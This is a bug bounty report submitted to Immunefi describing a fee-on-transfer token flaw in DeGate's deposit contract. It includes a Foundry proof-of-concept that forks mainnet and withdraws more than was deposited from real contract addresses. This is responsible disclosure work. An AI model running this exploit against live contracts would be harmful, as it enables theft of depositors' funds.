# 26468 - \[SC - Insight] Fee-on-transfer tokens can be used to steal oth...

Submitted on Dec 3rd 2023 at 15:57:51 UTC by @xBentley for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26468

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x54D7aE423Edb07282645e740C046B9373970a168#code>

Impacts:

* Direct theft of user funds from the Default Deposit Contract that is less than 1,000,000 USD.

## Description

## Bug Description

The protocol has implemented a function that is supposed to handle fee-on-transfer tokens called setCheckBalance on the DefaultDepositContract. However, this function can be easily bypassed since it requires contract admin to set correct params BEFORE a deposit transaction. This is not practical since it requires the admin to front-run every deposit, check that the token applies fees to transfers and then set the correct settings.

## Impact

When withdraing, users can steal other depositor tokens and drain the pool.

## Risk Breakdown

Difficulty to Exploit: Easy Weakness: CVSS2 Score:

## Recommendation

It is recommended that the contract instead should rely on ACTUAL balances before and after a deposit to determine if the token applies fees on transfers.

## References

## Proof of concept

I have provided this test as a POC:

```
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract DeGateTestContract is Test {
    IExchangeV3 xv3 = IExchangeV3(0x9C07A72177c5A05410cA338823e790876E79D73B);
    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), 18558127);
    }

    function testZero() public {
        vm.startPrank(0x3AD80b5C8FbD3599E24Bf23246171ddbcC4f366A);
        //Balance at genesis
        assertEq(0,IERC20(0xa7DE087329BFcda5639247F96140f9DAbe3DeED1).balanceOf(0x54D7aE423Edb07282645e740C046B9373970a168));
        IERC20(0xa7DE087329BFcda5639247F96140f9DAbe3DeED1).approve(0x54D7aE423Edb07282645e740C046B9373970a168, 12000);
        xv3.deposit(
            0x3AD80b5C8FbD3599E24Bf23246171ddbcC4f366A,
            0x3AD80b5C8FbD3599E24Bf23246171ddbcC4f366A,
            0xa7DE087329BFcda5639247F96140f9DAbe3DeED1,
            10000,
            ""
            );
        //Balance after deposit and fee of 100    
        assertEq(9900,IERC20(0xa7DE087329BFcda5639247F96140f9DAbe3DeED1).balanceOf(0x54D7aE423Edb07282645e740C046B9373970a168));    
        skip(1396000);
        IERC20(0xa7DE087329BFcda5639247F96140f9DAbe3DeED1).transfer(0x54D7aE423Edb07282645e740C046B9373970a168, 500);
        //Balance after donation of 500
        assertEq(10395,IERC20(0xa7DE087329BFcda5639247F96140f9DAbe3DeED1).balanceOf(0x54D7aE423Edb07282645e740C046B9373970a168));    
        xv3.withdrawFromDepositRequest(0x3AD80b5C8FbD3599E24Bf23246171ddbcC4f366A,0xa7DE087329BFcda5639247F96140f9DAbe3DeED1);
        //Balance at end
        assertEq(395,IERC20(0xa7DE087329BFcda5639247F96140f9DAbe3DeED1).balanceOf(0x54D7aE423Edb07282645e740C046B9373970a168));    
        
    }
}

interface IExchangeV3{
    function deposit(
        address from,
        address to,
        address tokenAddress,
        uint248  amount,
        bytes calldata extraData
        )
        external
        payable;
    function withdrawFromDepositRequest(
        address owner,
        address token
        )
        external
        ;    
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
//RPC_URL=$ALCHEMY_API forge test --match-contract DeGateTestContract
```
